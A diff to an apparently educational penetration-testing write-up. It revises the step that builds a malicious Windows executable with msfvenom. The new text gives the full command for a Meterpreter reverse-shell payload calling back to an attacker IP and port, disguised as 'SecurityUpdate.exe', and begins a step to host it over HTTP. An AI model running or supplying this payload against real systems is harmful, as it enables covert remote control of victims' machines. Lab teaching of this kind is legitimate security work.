@@ -8,43 +8,35 @@ Create a malicious payload and a delivery mechanism for the attack.
 
     Use **MSFVenom**, a tool for creating payloads, to generate a **malicious executable** that executes a **Meterpreter shell** (Metasploit's remote control payload). 
 
-![image](https://github.com/user-attachments/assets/636861be-e51d-4841-a33c-b1e6b0e7b608)
+![image](https://github.com/user-attachments/assets/a7b94074-04e0-431c-b011-2252d538c3de)
 
-### Explanation of the Command:
-
-  - `msfvenom` – A tool used to generate payloads (malicious code) for penetration testing.
-  - `-p windows/meterpreter/reverse_tcp` – This specifies the payload type:
-    - `windows/meterpreter/reverse_tcp` creates a **reverse shell**, meaning the victim's machine will connect back to the attacker's system.
-  - `LHOST=10.19.19.134` – The attacker's IP address where the victim's machine will connect to.
-  - `LPORT=4444` – The port on which the attacker's computer is listening for incoming connections.
-  - `-f exe` – Specifies the output format of the payload as a **Windows executable** (`.exe`).
-  - `-o SecurityUpdate.exe` – Saves the malicious executable file as `SecurityUpdate.exe`.
-
-## The Output:
-
-- The tool automatically targets **Windows**.
-- **x86 (32-bit architecture)** is selected, as no specific architecture was defined.
-- The payload is **354 bytes** in size, while the final executable is **73,802 bytes**.
-- The malicious file is saved as `SecurityUpdate.exe`.
-
-### What This Means:
-
-When `SecurityUpdate.exe` is executed on a Windows system, it connects back to the attacker's IP (**10.19.19.134:4444**) and provides remote control through the **Meterpreter shell**.
-
-
-### Verifying the Payload Type:
-Use the `file` command to check the type of the generated file (`SecurityUpdate.exe`):
-
+### 🔹 Payload Generation Command:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.19.19.134 LPORT=4444 -f exe -o SecurityUpdate.exe
 ```
- file SecurityUpdate.exe
-```
-1. `PE32 executable` – This means it is a Portable Executable (PE) file, which is a common format for Windows programs.
-2. `(GUI)` – The program is designed to run with a Graphical User Interface (GUI) rather than in the command line (CLI).
-3. `Intel 80386` – This indicates the file is built for 32-bit (x86) architecture.
-4. `for MS Windows` – The file is meant to run on Microsoft Windows.
-5. `4 sections` – The executable has four sections inside it (such as code, data, resources, etc.), which is typical for compiled Windows programs.
 
-This confirms that `SecurityUpdate.exe` is a **32-bit Windows executable** with a GUI. If run, it will execute the embedded Meterpreter payload.
+### 🔹 Explanation of the Command:
+| Parameter | Explanation |
+|-----------|-------------|
+| `msfvenom` | A tool to generate payloads for penetration testing. |
+| `-p windows/x64/meterpreter/reverse_tcp` | Creates a **64-bit reverse shell** for Windows. |
+| `LHOST=10.19.19.134` | The attacker's IP address. |
+| `LPORT=4444` | The attacker's listening port. |
+| `-f exe` | Specifies the output format as a Windows **executable** (`.exe`). |
+| `-o SecurityUpdate.exe` | Saves the generated payload as `SecurityUpdate.exe`. |
+
+### 🔹 Checking the Payload Type:
+Run the `file` command:
+```bash
+file SecurityUpdate.exe
+```
+#### Expected Output:
+```
+SecurityUpdate.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
+```
+- ✅ **64-bit Windows Executable**
+- ✅ **Designed for Graphical UI**
+- ✅ **Portable Executable (PE) format**
 
 2. Host the Payload Using a Python HTTP Server.
 
